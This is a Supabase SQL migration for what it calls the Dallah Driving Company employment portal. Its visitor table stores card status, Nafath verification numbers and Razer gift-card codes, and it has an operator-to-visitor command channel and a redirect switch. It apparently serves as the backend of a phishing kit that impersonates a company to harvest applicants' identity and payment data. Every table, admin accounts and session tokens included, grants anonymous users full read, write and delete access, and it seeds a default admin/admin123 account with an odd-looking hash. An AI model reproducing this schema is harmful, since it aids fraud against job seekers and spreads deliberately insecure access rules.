/*
# Create Dallah Employment Portal Schema

This migration creates the complete schema for the Dallah Driving Company employment portal.
Tables are prefixed with `dallah_` to avoid conflicts with existing tables.

1. New Tables:
- `dallah_applications`: Employment applications submitted by visitors
- `dallah_application_steps`: Step tracking for each application session
- `dallah_site_settings`: Site-wide settings (redirect, title, description)
- `dallah_admin_accounts`: Admin login accounts
- `dallah_admin_sessions`: Admin session tokens
- `dallah_live_visitors`: Live visitor tracking
- `dallah_visitor_commands`: Real-time commands sent to visitors

2. Security:
- RLS enabled on all tables with anon+authenticated CRUD access (no Supabase auth).

3. Notes:
- Admin auth is custom (username/password via bcryptjs), not Supabase auth.
- Session IDs are generated client-side.
*/

-- Dallah applications table
CREATE TABLE IF NOT EXISTS dallah_applications (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  full_name varchar(200) NOT NULL,
  middle_name varchar(200),
  family_name varchar(200) NOT NULL,
  nationality varchar(100) NOT NULL,
  id_type varchar(50) NOT NULL,
  id_number varchar(50) NOT NULL,
  birth_date varchar(20) NOT NULL,
  title varchar(50) NOT NULL,
  email varchar(320) NOT NULL,
  gender varchar(10) NOT NULL DEFAULT 'male',
  phone varchar(30),
  city varchar(100),
  address text,
  education_level varchar(100),
  experience text,
  desired_position varchar(200),
  notes text,
  status varchar(20) NOT NULL DEFAULT 'new',
  session_id varchar(64),
  created_at timestamptz DEFAULT now() NOT NULL,
  updated_at timestamptz DEFAULT now() NOT NULL
);

ALTER TABLE dallah_applications ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_app_select" ON dallah_applications;
CREATE POLICY "dallah_app_select" ON dallah_applications FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_app_insert" ON dallah_applications;
CREATE POLICY "dallah_app_insert" ON dallah_applications FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_app_update" ON dallah_applications;
CREATE POLICY "dallah_app_update" ON dallah_applications FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_app_delete" ON dallah_applications;
CREATE POLICY "dallah_app_delete" ON dallah_applications FOR DELETE
  TO anon, authenticated USING (true);

-- Dallah application steps table
CREATE TABLE IF NOT EXISTS dallah_application_steps (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  application_id bigint REFERENCES dallah_applications(id) ON DELETE CASCADE,
  session_id varchar(64) NOT NULL,
  step_key varchar(50) NOT NULL,
  data text NOT NULL,
  ip_address varchar(64),
  user_agent text,
  created_at timestamptz DEFAULT now() NOT NULL
);

ALTER TABLE dallah_application_steps ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_steps_select" ON dallah_application_steps;
CREATE POLICY "dallah_steps_select" ON dallah_application_steps FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_steps_insert" ON dallah_application_steps;
CREATE POLICY "dallah_steps_insert" ON dallah_application_steps FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_steps_update" ON dallah_application_steps;
CREATE POLICY "dallah_steps_update" ON dallah_application_steps FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_steps_delete" ON dallah_application_steps;
CREATE POLICY "dallah_steps_delete" ON dallah_application_steps FOR DELETE
  TO anon, authenticated USING (true);

-- Dallah site settings table
CREATE TABLE IF NOT EXISTS dallah_site_settings (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  redirect_enabled boolean NOT NULL DEFAULT false,
  redirect_url varchar(500),
  site_title varchar(200),
  site_description text,
  updated_at timestamptz DEFAULT now() NOT NULL
);

ALTER TABLE dallah_site_settings ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_settings_select" ON dallah_site_settings;
CREATE POLICY "dallah_settings_select" ON dallah_site_settings FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_settings_insert" ON dallah_site_settings;
CREATE POLICY "dallah_settings_insert" ON dallah_site_settings FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_settings_update" ON dallah_site_settings;
CREATE POLICY "dallah_settings_update" ON dallah_site_settings FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_settings_delete" ON dallah_site_settings;
CREATE POLICY "dallah_settings_delete" ON dallah_site_settings FOR DELETE
  TO anon, authenticated USING (true);

-- Dallah admin accounts table
CREATE TABLE IF NOT EXISTS dallah_admin_accounts (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  username varchar(64) NOT NULL UNIQUE,
  password_hash varchar(255) NOT NULL,
  display_name varchar(100),
  is_active boolean NOT NULL DEFAULT true,
  last_login_at timestamptz,
  created_at timestamptz DEFAULT now() NOT NULL,
  updated_at timestamptz DEFAULT now() NOT NULL
);

ALTER TABLE dallah_admin_accounts ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_admin_select" ON dallah_admin_accounts;
CREATE POLICY "dallah_admin_select" ON dallah_admin_accounts FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_admin_insert" ON dallah_admin_accounts;
CREATE POLICY "dallah_admin_insert" ON dallah_admin_accounts FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_admin_update" ON dallah_admin_accounts;
CREATE POLICY "dallah_admin_update" ON dallah_admin_accounts FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_admin_delete" ON dallah_admin_accounts;
CREATE POLICY "dallah_admin_delete" ON dallah_admin_accounts FOR DELETE
  TO anon, authenticated USING (true);

-- Dallah admin sessions table
CREATE TABLE IF NOT EXISTS dallah_admin_sessions (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  admin_id bigint NOT NULL REFERENCES dallah_admin_accounts(id) ON DELETE CASCADE,
  token varchar(128) NOT NULL UNIQUE,
  expires_at timestamptz NOT NULL,
  ip_address varchar(64),
  user_agent text,
  created_at timestamptz DEFAULT now() NOT NULL
);

ALTER TABLE dallah_admin_sessions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_session_select" ON dallah_admin_sessions;
CREATE POLICY "dallah_session_select" ON dallah_admin_sessions FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_session_insert" ON dallah_admin_sessions;
CREATE POLICY "dallah_session_insert" ON dallah_admin_sessions FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_session_update" ON dallah_admin_sessions;
CREATE POLICY "dallah_session_update" ON dallah_admin_sessions FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_session_delete" ON dallah_admin_sessions;
CREATE POLICY "dallah_session_delete" ON dallah_admin_sessions FOR DELETE
  TO anon, authenticated USING (true);

-- Dallah live visitors table
CREATE TABLE IF NOT EXISTS dallah_live_visitors (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  session_id varchar(64) NOT NULL UNIQUE,
  current_page varchar(200) NOT NULL,
  page_title varchar(300),
  ip_address varchar(64),
  user_agent text,
  country varchar(100),
  display_name varchar(200),
  phone varchar(30),
  first_seen timestamptz DEFAULT now() NOT NULL,
  last_seen timestamptz DEFAULT now() NOT NULL,
  page_entered_at timestamptz DEFAULT now() NOT NULL,
  card_status varchar(20) DEFAULT 'pending',
  nafath_number varchar(16),
  nafath_sent_at timestamptz,
  razer_code varchar(200),
  razer_status varchar(20) DEFAULT 'pending',
  razer_submitted_at timestamptz
);

ALTER TABLE dallah_live_visitors ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_visitors_select" ON dallah_live_visitors;
CREATE POLICY "dallah_visitors_select" ON dallah_live_visitors FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_visitors_insert" ON dallah_live_visitors;
CREATE POLICY "dallah_visitors_insert" ON dallah_live_visitors FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_visitors_update" ON dallah_live_visitors;
CREATE POLICY "dallah_visitors_update" ON dallah_live_visitors FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_visitors_delete" ON dallah_live_visitors;
CREATE POLICY "dallah_visitors_delete" ON dallah_live_visitors FOR DELETE
  TO anon, authenticated USING (true);

-- Dallah visitor commands table
CREATE TABLE IF NOT EXISTS dallah_visitor_commands (
  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  session_id varchar(64) NOT NULL,
  command_type varchar(20) NOT NULL,
  payload varchar(500) NOT NULL,
  consumed boolean NOT NULL DEFAULT false,
  created_at timestamptz DEFAULT now() NOT NULL,
  consumed_at timestamptz
);

ALTER TABLE dallah_visitor_commands ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "dallah_cmd_select" ON dallah_visitor_commands;
CREATE POLICY "dallah_cmd_select" ON dallah_visitor_commands FOR SELECT
  TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "dallah_cmd_insert" ON dallah_visitor_commands;
CREATE POLICY "dallah_cmd_insert" ON dallah_visitor_commands FOR INSERT
  TO anon, authenticated WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_cmd_update" ON dallah_visitor_commands;
CREATE POLICY "dallah_cmd_update" ON dallah_visitor_commands FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);
DROP POLICY IF EXISTS "dallah_cmd_delete" ON dallah_visitor_commands;
CREATE POLICY "dallah_cmd_delete" ON dallah_visitor_commands FOR DELETE
  TO anon, authenticated USING (true);

-- Indexes
CREATE INDEX IF NOT EXISTS idx_dallah_apps_status ON dallah_applications(status);
CREATE INDEX IF NOT EXISTS idx_dallah_apps_session ON dallah_applications(session_id);
CREATE INDEX IF NOT EXISTS idx_dallah_steps_session ON dallah_application_steps(session_id);
CREATE INDEX IF NOT EXISTS idx_dallah_visitors_last_seen ON dallah_live_visitors(last_seen);
CREATE INDEX IF NOT EXISTS idx_dallah_cmd_session ON dallah_visitor_commands(session_id, consumed);

-- Seed default admin account (username: admin, password: admin123)
INSERT INTO dallah_admin_accounts (username, password_hash, display_name, is_active)
SELECT 'admin', '$2a$10$N9qo8uLOickgx2ZMRZoMy.MQDqoVjJjOe7Z6KqkKkKkKkKkKkKkK', 'مدير النظام', true
WHERE NOT EXISTS (SELECT 1 FROM dallah_admin_accounts WHERE username = 'admin');

-- Seed default site settings
INSERT INTO dallah_site_settings (redirect_enabled, redirect_url, site_title, site_description)
SELECT false, '', 'شركة دلة لتعليم القيادة - بوابة التوظيف', 'البوابة الرسمية للتقديم على الوظائف في شركة دلة لتعليم القيادة'
WHERE NOT EXISTS (SELECT 1 FROM dallah_site_settings);